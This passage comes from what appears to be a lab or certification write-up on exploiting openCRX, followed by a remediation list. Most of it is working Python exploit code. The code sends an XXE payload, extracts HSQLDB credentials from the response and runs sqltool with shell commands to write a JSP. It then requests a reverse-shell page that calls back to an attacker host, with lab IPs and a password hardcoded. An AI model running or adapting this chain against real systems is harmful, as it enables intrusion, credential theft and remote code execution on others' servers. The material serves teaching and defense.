        <org.opencrx.kernel.account1.Contact>
        <lastName>XXE_FILE_START
        &probe;
        XXE_FILE_END</lastName>
        <firstName>Probe</firstName>
        </org.opencrx.kernel.account1.Contact>
    ''')

    response = requests.post(
        f"http://{rhost}:{rport}/opencrx-rest-CRX/"
        "org.opencrx.kernel.account1/provider/CRX/"
        "segment/Standard/account",
        data=xml_payload.encode("utf-8"),
        auth=(username, password),
        proxies=proxies,
    )
    match = re.search(
        r'hsqldb:hsql://127.0.0.1:([0-9]+)/CRX '
        r'--user (.*?) --password ([^\s<]+)',
        response.text,
    )
    if not match:
        print("Database credentials not found")
        sys.exit(1)

    db_port = match.group(1).strip()
    db_username = match.group(2).strip()
    db_password = match.group(3).strip()

    create_procedure = (
        f"echo {db_password} | java -jar sqltool.jar "
        f"--inlineRC=url=jdbc:hsqldb:hsql://{rhost}:{db_port}/CRX,"
        f"user={db_username} sql_payload_01.sql"
    )
    result = subprocess.run(create_procedure, shell=True)
    if result.returncode != 0:
        print("Create procedure failed")
        sys.exit(1)

    write_jsp = (
        f"echo {db_password} | java -jar sqltool.jar "
        f"--inlineRC=url=jdbc:hsqldb:hsql://{rhost}:{db_port}/CRX,"
        f"user={db_username} sql_payload_02.sql"
    )
    result = subprocess.run(write_jsp, shell=True)
    if result.returncode != 0:
        print("Write JSP failed")
        sys.exit(1)

    requests.get(url + "rev_shell1.jsp", proxies=proxies)


if __name__ == '__main__':
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    rhost = "192.168.109.126"
    rport = "8080"
    lhost = "192.168.45.207"
    lport = "1234"
    username = "admin-Standard"
    provider = "CRX"
    segment = "Standard"
    password = "Pariston1952"
    url = f"http://{rhost}:{rport}/opencrx-core-CRX/"

    start_time = int(time.time() * 1000 - 1000)
    send_reset_password_request()
    end_time = int(time.time() * 1000 + 1000)

    reset_password(start_time, end_time)
    obtain_reverse_shell()
```


## Summary and Remediation

This chain uses white-box analysis to obtain authenticated access, combines white-box and black-box techniques to exploit XXE for server enumeration, extracts HSQLDB credentials, abuses Java Language Routines for arbitrary file write, and finally deploys a command shell.

The primary fixes are:

1. Generate password-reset tokens with `SecureRandom`, expire them quickly, store only a digest, make them single-use, and rate-limit both reset requests and confirmation attempts.
2. Return identical responses for valid and invalid account identifiers to prevent account enumeration.
3. Disable DTD and external-entity processing in every XML parser that consumes untrusted data.
4. Remove verbose database and parser errors from HTTP responses.
5. Bind HSQLDB to localhost or a private management network, enforce an ACL, rotate exposed credentials, and apply least privilege.
6. Restrict or disable HSQLDB Java Language Routines when they are not required.
7. Run the database and application under separate, low-privilege accounts with write access limited to required directories.
8. Prevent application and database accounts from writing executable content into deployed Web roots.

The key audit lesson is that each vulnerability supplies the prerequisite for the next one. The predictable token creates an authenticated foothold; XXE discloses filesystem structure and database secrets; remote HSQLDB access exposes a Java execution primitive; and that primitive converts file write into Web-accessible code execution.
